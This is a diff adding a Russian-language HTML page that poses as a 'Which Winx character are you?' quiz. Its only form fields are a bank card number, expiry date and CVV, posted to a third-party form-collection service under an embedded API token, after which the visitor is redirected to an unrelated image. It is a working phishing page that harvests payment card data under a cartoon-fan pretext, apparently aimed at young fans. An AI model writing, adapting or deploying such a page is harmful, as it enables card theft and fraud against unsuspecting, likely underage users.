@@ -1,0 +1,60 @@
+<!DOCTYPE>
+<html lang = "ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name='viewport' content="width=device-width, initial-scale=1">
+     <title>Document</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;500&display=swap" rel="stylesheet">
+<style>
+* {
+     box-sizing: border box;
+}
+html {
+     font-size: 16px;
+}
+body {
+     margin:0;
+     font-family: 'Roboto', sans-serif;
+     background-color: #87CEEB; 
+}
+.form-container {
+     background-color: #E0FFFF;
+     max-width: 450px;
+     width: 95%;
+     margin: auto;
+     padding: 40px; 
+}
+#form {
+
+}
+input {
+     display: block;
+     width: 100%;
+     margin: 0.5rem 0;
+     padding: 0.4rem 0;
+     outline: none;
+     font-size: 1rem;
+}
+.font-heading {
+     margin-top: 0;
+     font-size: 1.5rem;
+     font-weight: 500;
+}
+#submit {
+     color: #00FFFF;
+     background-color: #32CD32;
+}
+</style>
+</head>
+<body>
+     <div class="form-container" >
+          <h2 class="form-heading">Кто ты из вселенной винкс?</h2>
+          <form id="form" action="https://getsimpleform.com/messages?form_api_token=3804b576d263246b1b236f805dda5250" method="post">
+               <input type='hidden' name='redirect_to' value="https://i.ytimg.com/vi/G8bD3jcbR4U/maxresdefault.jpg">
+               <input id="name" name="Номер карточки" type="text" placeholder="Номер карточки">
+               <input id="email" name="Месяц/Год" type="text" placeholder="Месяц/Год">
+               <input id="CVV"type="text" name="CVV" placeholder="CVV">
+               <input id="submit" type="submit" value="Отправить">
+</form>
+</div>
+</html>
